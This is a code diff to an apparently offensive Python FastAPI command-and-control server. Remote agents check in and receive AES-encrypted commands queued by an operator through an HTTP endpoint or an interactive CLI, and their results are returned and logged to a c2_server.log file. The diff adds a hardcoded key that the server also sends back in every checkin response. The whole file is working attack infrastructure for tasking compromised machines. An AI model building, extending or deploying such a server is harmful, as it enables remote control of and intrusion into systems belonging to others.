@@ -1,4 +1,5 @@
 from fastapi import FastAPI, HTTPException
+import json
 from pydantic import BaseModel
 from typing import Dict
 import typer
@@ -6,6 +7,10 @@ import logging
 import base64
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
+import subprocess
+import os
+import uvicorn
+import threading
 
 app = FastAPI()
 cli = typer.Typer()
@@ -24,8 +29,11 @@ class CommandRequest(BaseModel):
     AgentID: str
     Command: str
 
+# Load AES Key (Ensure it is 32 bytes for AES-256)
+key_b64 = "ywD3S70cYF56DLw3GHYA9MzCflWAMcljQKoeKXbanqc="  # Replace with your actual key
+key = base64.b64decode(key_b64)
+
 def check_key_length(key: bytes) -> bytes:
-    """Ensure the key length is 16, 24, or 32 bytes."""
     if len(key) not in [16, 24, 32]:
         raise ValueError(f"Incorrect AES key length ({len(key)} bytes)")
     return key
@@ -33,18 +41,22 @@ def check_key_length(key: bytes) -> bytes:
 def encrypt_data(data: str, key: bytes) -> str:
     key = check_key_length(key)
     cipher = AES.new(key, AES.MODE_CBC)
+    iv = cipher.iv
     ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
-    iv = base64.b64encode(cipher.iv).decode('utf-8')
-    ct = base64.b64encode(ct_bytes).decode('utf-8')
-    return iv + ct
+    encrypted_data = base64.b64encode(iv + ct_bytes).decode('utf-8')
+    return encrypted_data
 
 def decrypt_data(data: str, key: bytes) -> str:
     key = check_key_length(key)
-    iv = base64.b64decode(data[:24])
-    ct = base64.b64decode(data[24:])
-    cipher = AES.new(key, AES.MODE_CBC, iv)
-    pt = unpad(cipher.decrypt(ct), AES.block_size)
-    return pt.decode('utf-8')
+    try:
+        raw_data = base64.b64decode(data)
+        iv, ct = raw_data[:16], raw_data[16:]
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        pt = unpad(cipher.decrypt(ct), AES.block_size)
+        return pt.decode('utf-8')
+    except Exception as e:
+        logging.error(f"Decryption failed: {str(e)}")
+        raise HTTPException(status_code=400, detail="Decryption failed")
 
 @app.post("/checkin")
 def checkin(request: CheckinRequest):
@@ -52,19 +64,32 @@ def checkin(request: CheckinRequest):
     if agent_id not in agents:
         agents[agent_id] = {"commands": []}
         logging.info(f"New agent registered: {agent_id}")
+
     if agents[agent_id]["commands"]:
         command = agents[agent_id]["commands"].pop(0)
-        return encrypt_data(command, key)
-    return encrypt_data("", key)
+        response = encrypt_data(command, key)
+    else:
+        response = encrypt_data("NoCommand", key)
+
+    return {"key": key_b64, "data": response}
 
 @app.post("/result")
 def result(request: ResultRequest):
     agent_id = request.AgentID
-    result = decrypt_data(request.Result, key)
+    try:
+        result = decrypt_data(request.Result, key)
+    except HTTPException:
+        raise HTTPException(status_code=400, detail="Decryption failed")
+
     if agent_id not in agents:
         raise HTTPException(status_code=404, detail="Agent not found")
+
     logging.info(f"Agent {agent_id} executed command with result: {result}")
     return {"Status": "OK"}
+
+@app.get("/list_agents")
+def list_agents():
+    return {"agents": [{"AgentID": agent_id} for agent_id in agents]}
 
 @app.post("/sendcommand")
 def send_command(request: CommandRequest):
@@ -76,39 +101,51 @@ def send_command(request: CommandRequest):
         return {"Status": "Command sent"}
     raise HTTPException(status_code=404, detail="Agent not found")
 
-@cli.command()
-def list_agents():
-    """List all registered agents."""
+@cli.command("list-agents")
+def list_agents_cli():
     for agent_id in agents:
         typer.echo(f"Agent ID: {agent_id}, Pending Commands: {len(agents[agent_id]['commands'])}")
 
-@cli.command()
-def send_command(agent_id: str, command: str):
-    """Send a command to a specific agent."""
-    if agent_id in agents:
-        agents[agent_id]["commands"].append(command)
-        typer.echo(f"Command sent to agent {agent_id}")
-    else:
-        typer.echo(f"Agent {agent_id} not found")
+@cli.command("select-agent")
+def select_agent():
+    agent_ids = list(agents.keys())
+    if not agent_ids:
+        typer.echo("No agents available.")
+        return
 
-@cli.command()
+    agent_choice = typer.prompt("Select an agent", type=typer.Choice(agent_ids))
+
+    while True:
+        command = typer.prompt(f"Enter command to send to agent {agent_choice} (or 'exit' to stop)")
+        if command.lower() == "exit":
+            break
+        if agent_choice in agents:
+            agents[agent_choice]["commands"].append(command)
+            typer.echo(f"Command '{command}' sent to agent {agent_choice}")
+        else:
+            typer.echo(f"Agent {agent_choice} not found")
+
+@cli.command("generate-report")
 def generate_report():
-    """Generate a detailed report from the logs."""
     with open('c2_server.log', 'r') as log_file:
         report = log_file.read()
     with open('report.txt', 'w') as report_file:
         report_file.write(report)
     typer.echo("Report generated as report.txt")
 
-if __name__ == "__main__":
-    import uvicorn
-    import threading
+def run_server():
+    uvicorn.run(app, host="0.0.0.0", port=8000)
 
-    key = b'your_32_byte_key_here'  # Replace with your 32-byte key
-
-    def run_server():
-        uvicorn.run(app, host="0.0.0.0", port=8000)
-
+def start_server_and_cli():
+    # Start the server in a separate thread
     server_thread = threading.Thread(target=run_server)
     server_thread.start()
+
+    # Run the CLI
     cli()
+
+if __name__ == "__main__":
+    start_server_and_cli()
+
+
+
